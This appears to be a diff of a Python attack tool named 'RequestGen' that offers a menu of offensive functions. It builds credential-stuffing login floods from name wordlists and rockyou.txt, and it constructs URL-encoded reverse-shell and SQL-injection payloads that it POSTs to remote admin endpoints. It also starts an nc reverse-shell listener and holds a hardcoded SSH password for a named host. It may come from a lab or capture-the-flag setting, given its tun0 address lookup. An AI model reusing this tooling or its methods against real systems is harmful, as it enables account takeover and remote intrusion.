@@ -6,36 +6,43 @@ import json
 import webbrowser
 import urllib.parse
 import subprocess
+import socket
+import netifaces as ni
 
-def clear():
+def clear(f):
+    def wrapper(*args,**kwargs):
         if name == 'nt':
             _=system('cls')
         else:
             _=system('clear')
 
+        f(*args, **kwargs)
+    return wrapper
+
+@clear
 def menu_maker(menu):
-        counter=0
-        while counter < len(menu):
-            print('[{}]'.format(counter),menu[counter])
-            counter = counter + 1
+    counter=0
+    while counter < len(menu):
+        print('[{}]'.format(counter),menu[counter])
+        counter = counter + 1
 
-def run_command():
-    clear()
-    global port_number, menu
-    menu = ['Reverse Shell Listener', 'SSH Login']
-    menu_maker(menu)
-    option1 = input("\n    Choice:  ")
-    clear()
-    
-    command_dictionary ={
-        '0':"subprocess.run(['nc','-nlvp',port_number])",
-        '1':"subprocess.run(['sshpass','-p','SuPeRSeCrEt','ssh','ez@107.172.29.202'])",
-    }
-
-    if option1 == '0':
-        port_number = input('\nEnter listener PORT:  ')
-
-    eval(command_dictionary[option1])
+class System_Commands():
+    @clear
+    def run_command(self):
+        global port_number, menu
+        menu = ['Reverse Shell Listener', 'SSH Login (107.172.29.202)','Start HTTP File Server', 'Connect to OpenVPN']
+        command_dictionary ={
+            '0':"subprocess.Popen(['nc','-nlvp',port_number], close_fds=True)",
+            '1':"subprocess.run(['sshpass','-p','SuPeRSeCrEt','ssh','ez@107.172.29.202'])",
+            '2':"subprocess.run(['python3','-m','http.server','8000'])",
+            '3':"subprocess.Popen(['sudo', 'openvpn', 'reconstructed.ovpn'], close_fds=True)"
+        }
+        menu_maker(menu)
+        option1 = input("\n    Choice:  ")
+        if option1 == '0':
+            Construct_Payload.port()
+        eval(command_dictionary[option1])
+Run_Command = System_Commands()
 
 # Holds content to build various POST requests
 class Request_Builder():
@@ -122,22 +129,21 @@ Construct_Header = Request_Builder()
 class Login_Builder():
     def __init__(self):
         # clear()
-        global email_list, password_list, payload_list
+        global count
         self.first_name_list = []
         self.last_name_list = []
-        email_list = []
-        password_list = []
-        payload_list = []
+        self.email_list = []
+        self.password_list = []
+        self.payload_list = []
         self.first_names = {"field":"first_name", "file":'./wordlist/first_names.txt', "encoding":"UTF-8", "payload":self.first_name_list}
         self.last_names = {"field":"last_name", "file":'./wordlist/last_names.txt', "encoding":"ISO-8859-1", "payload":self.last_name_list}
-        self.email_extensions = {"field":"email_extension", "file":'./wordlist/email_extensions.txt', "encoding":"UTF-8", "payload":email_list}
-        self.passwords = {"field":"password", "file":'/home/charles/Downloads/rockyou.txt', "encoding":"ISO-8859-1", "payload":password_list}
+        self.email_extensions = {"field":"email_extension", "file":'./wordlist/email_extensions.txt', "encoding":"UTF-8", "payload":self.email_list}
+        self.passwords = {"field":"password", "file":'/home/charles/Downloads/rockyou.txt', "encoding":"ISO-8859-1", "payload":self.password_list}
         self.master_dictionary=[self.first_names, self.last_names, self.email_extensions, self.passwords]
 
-
+    @clear
     def payload_builder(self):
-        global count, email_list, password_list, payload_list, delay, min_sleep, max_sleep
-
+        global min_sleep, max_sleep, delay, count
         choice = input("\nDelay between sending logins?   (y/n):  ")
         if choice == 'y':
             delay = True
@@ -161,20 +167,20 @@ class Login_Builder():
                     item["payload"].append(string)
 
         for i in range(count):        
-            username = self.first_name_list[i] + self.last_name_list[i] + email_list[i]
-            password = password_list[i]
-            payload_list.append({'u':username, 'p':password})
+            username = self.first_name_list[i] + self.last_name_list[i] + self.email_list[i]
+            password = self.password_list[i]
+            self.payload_list.append({'u':username, 'p':password})
 Construct_Login = Login_Builder()
 
 # Sends POST requests from supplied request data.
 class Request_Sender():
+    @clear
     def post_request_sender(self):
-        self.delay = False
+        delay = False
         global count, url, header, body, payload_list, min_sleep, max_sleep
-
         for i in range(count):
-            if payload_list:
-                body = payload_list[i]
+            # if payload_list:
+            #     body = payload_list[i]
             r = requests.post(url=url, headers=header ,data=json.dumps(body))
 
             print("\n\n",r,"\n\n",url,"\n\n",body,"\n\n",r.content)
@@ -186,15 +192,15 @@ class Request_Sender():
                 if delay == True:
                     sleep(random.randint(min_sleep,max_sleep))
             
-            webbrowser.open(url, new=0, autoraise=True)
+            # webbrowser.open(url, new=0, autoraise=True)
 Construct_Request = Request_Sender()
 
 # Constructs various payloads.
 class Payloads():
     def __init__(self):
-        global shell_command, ip_address, port_number
+        global command_dictionary
         # Constructing a dictionary to run the menu and generate payloads
-        self.command_dictionary = {
+        command_dictionary = {
             # Bash reverse shell commands
             "0":{
                 # Bash TCP shells
@@ -226,58 +232,73 @@ class Payloads():
             }
         }
 
-    def ip_port(self):
-        clear()
-        global shell_command, ip_address, port_number
-        ip_address = input('\nEnter listener IP:  ')
-        port_number = input('Enter listener PORT:  ')
+    @clear
+    def ip(self):
+        global ip_address
+        # ip_address = input('\nEnter IP:  ')
+        ni.ifaddresses('tun0')
+        ip_address = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+        print(ip_address)
+        
+    @clear
+    def port(self):
+        global port_number
+        port_number = input('Enter PORT:  ')
 
+    @clear
     def command_constructor(self):
-        global shell_command, ip_address, port_number, body
-        clear()
+        global shell_command, ip_address, port_number, body, command_dictionary
         # Build options menu with a list and while loop to print it's contents
         menu = ['Bash','Netcat','Python','File Server','SQL Injection']
         menu_maker(menu)
         option1 = input("\n    Choice:  ")
-        clear()
 
         # Display dictionary key names and their values
-        for key, value in self.command_dictionary[option1].items():
+        for key, value in command_dictionary[option1].items():
             print ('    [{}]'.format(key), value.format(ip_address, port_number))
 
         option2 = input('\n    Choice:  ')
-        # shell_command = urllib.parse.quote(self.command_dictionary[option1][option2].format(ip_address, port_number))
-        shell_command = self.command_dictionary[option1][option2].format(ip_address, port_number)
+        shell_command = urllib.parse.quote(command_dictionary[option1][option2].format(ip_address, port_number))
+        # shell_command = command_dictionary[option1][option2].format(ip_address, port_number)
 Construct_Payload = Payloads()
 
 # Runs on script execution. Calls the other classes and functions accordingly.
 class Main_App():
-    clear()
+    @clear
     def __init__(self):
-        global count
-        count = 1
-        print("   **********************\n         RequestGen\n   **********************\n")
+        global count, call_list
+        while True:
+            call_list = []
+            count = 1
+            print("   **********************\n         RequestGen\n   **********************\n")
 
-        menu = ['Login Flooder',"Remote System Admin (10.8.0.9)", "EZ's Admin Command (107.172.29.202)", "Other Commands"]
-        menu_maker(menu)
-        choice = input("\n    Choice:  ")
+            menu = ['Login Flooder',"Remote System Admin (10.8.0.9) [NOT WORKING]", "EZ's Admin Command (107.172.29.202)", "Other Commands"]
+            menu_maker(menu)
+            choice = input("\n    Choice:  ")
 
-        if choice == '0':
-            Construct_Header.phishing_counter()
-            Construct_Login.payload_builder()
+            # Login Flooder
+            if choice == '0':
+                Construct_Header.phishing_counter()
+                Construct_Login.payload_builder()
+                Construct_Request.post_request_sender()
 
-        elif choice =='1':
-            Construct_Payload.ip_port()
-            Construct_Payload.command_constructor()
-            Construct_Header.Remote_System_Admin()
-            
-        elif choice =='2':
-            Construct_Payload.ip_port()
-            Construct_Payload.command_constructor()
-            Construct_Header.EzsAdmin()
+            # Remote System Admin
+            elif choice =='1':
+                Construct_Payload.ip()
+                Construct_Payload.port()
+                Construct_Payload.command_constructor()
+                Construct_Header.Remote_System_Admin()
+                Construct_Request.post_request_sender()
 
-        elif choice =='3':
-            run_command()
+                
+            elif choice =='2':
+                Construct_Payload.ip()
+                Construct_Payload.port()
+                Construct_Payload.command_constructor()
+                Construct_Header.EzsAdmin()
+                Construct_Request.post_request_sender()
 
-        # Construct_Request.post_request_sender()
+
+            elif choice =='3':
+                Run_Command.run_command()
 Main_App()
